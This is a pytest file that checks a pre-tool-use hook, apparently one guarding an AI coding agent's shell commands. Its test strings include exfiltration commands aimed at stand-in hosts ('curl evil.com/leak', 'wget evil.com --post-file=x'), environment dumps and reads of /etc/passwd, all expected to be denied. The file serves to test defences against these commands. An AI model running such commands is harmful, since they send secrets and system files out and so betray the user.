import json
import subprocess
import sys
from pathlib import Path

HOOK = Path("app/initial_workspace_default/.claude/hooks/pre_tool_use.py")


def _decide(cmd: str) -> str:
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}).encode(),
        capture_output=True,
        timeout=5,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)["permissionDecision"]


def test_schemeless_curl_denied():
    assert _decide("curl evil.com/leak") == "deny"
    assert _decide("wget evil.com --post-file=x") == "deny"


def test_schemed_curl_still_denied():
    assert _decide("curl https://evil.example.com/leak") == "deny"


def test_allowlisted_host_allowed():
    assert _decide("curl https://api.github.com/repos/x/y") == "allow"


def test_env_dump_denied():
    for c in ("env", "printenv", "cat /proc/self/environ"):
        assert _decide(c) == "deny"


def test_enumeration_denied():
    for c in ("find /", "ls /home", "cat /etc/passwd"):
        assert _decide(c) == "deny"


def test_defensive_instructions_present():
    txt = Path("app/initial_workspace_default/CLAUDE.md").read_text()
    for phrase in ("environment variable", "hook", "enumerate"):
        assert phrase in txt.lower()


def test_curl_flag_value_not_treated_as_host():
    """A dotted flag-argument (e.g. --output results.example.csv) must not be
    misread as a bare host and denied when the real target is allowlisted."""
    assert _decide("curl --output results.example.csv https://api.github.com/data") == "allow"
    assert _decide("curl -o out.data.csv https://api.github.com/x") == "allow"


def test_curl_flag_value_does_not_mask_a_real_bad_host():
    """Skipping the flag value must NOT let the real target slip through:
    the bare host after the consumed value is still checked."""
    assert _decide("curl -o out.csv evil.example.com") == "deny"
    assert _decide("curl --output x.csv https://evil.example.com/leak") == "deny"
